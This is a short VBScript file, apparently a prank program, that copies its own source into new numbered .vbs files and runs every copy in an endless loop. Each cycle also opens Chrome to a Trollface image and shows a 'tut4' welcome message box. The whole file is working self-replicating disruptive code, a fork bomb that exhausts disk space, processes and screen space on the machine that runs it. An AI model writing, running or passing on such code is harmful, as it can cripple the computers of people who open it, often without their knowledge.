Dim st, scriptName : scriptName = WScript.ScriptName
set obj = wscript.CreateObject("wscript.shell")
set fso = CreateObject("Scripting.FileSystemObject")
spammable = "welcometotut"
scriptdir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
counter = 4
siteA = "https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png"
fff = 1
Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(scriptName,1)
strFileText = objFileToRead.ReadAll()
objFileToRead.Close
st=false
Do While st=false
  If fso.FileExists(spammable&".vbs") Then
     spammable = spammable & counter
     counter = counter + 1
  Else
    obj.run "chrome -url " & siteA
    fso.CreateTextFile(spammable & ".vbs")
    Set objFileToWrite = FSO.OpenTextFile(spammable&".vbs", 2)
    objFileToWrite.Write strFileText
    objFileToWrite.Close
    obj.run scriptName
    obj.run spammable&".vbs"
    name=msgbox ("Welcome to the wonderful world of tut4",37,"tut4")
  End If
loop
